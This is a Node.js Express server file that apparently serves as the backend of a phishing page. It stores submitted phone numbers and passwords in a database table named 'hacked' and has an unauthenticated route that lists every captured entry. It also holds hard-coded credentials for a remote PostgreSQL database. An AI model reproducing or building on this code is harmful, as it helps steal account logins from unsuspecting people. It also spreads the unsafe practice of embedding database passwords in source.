const express = require("express");
const pkg = require("pg");
const { Pool } = pkg;
const path = require("path");

const cors = require("cors");

const app = express();

app.use(cors());
app.use(express.json());

app.use(express.static(__dirname + '/static/style.css'));

const client = new Pool({
    user: 'brich',
    host: 'postgresql-brich.alwaysdata.net	',
    database: 'brich_data_data',
    password: 'rodyandry',
    port: 5432
});


client.connect();

app.use(express.static('client'));

/*app.get("/", (req, res) => {
    res.sendFile(__dirname + "/index.html");
});*/

///insert
app.post('/insert', async (req, res) => {
    const { number, password } = req.body;

    try {

        const query = 'INSERT INTO hacked (phone_number, password) VALUES ($1, $2)';
        await client.query(query, [number, password]);

        res.sendStatus(200);
    } catch (error) {
        console.error('Erreur lors de l\'insertion :', error);
        res.sendStatus(500);
    }
});


//select
app.get('/users', async (req, res) => {
    try {

        const query = 'SELECT * FROM hacked';
        const result = await client.query(query);
        console.log(result.rows);
        res.json(result.rows);
    } catch (error) {
        console.error('Error executing query:', error);
        res.status(500).json({ error: 'Internal Server Error' });
    }
});

app.listen(1234, () => {
    console.log("server demmarer");
})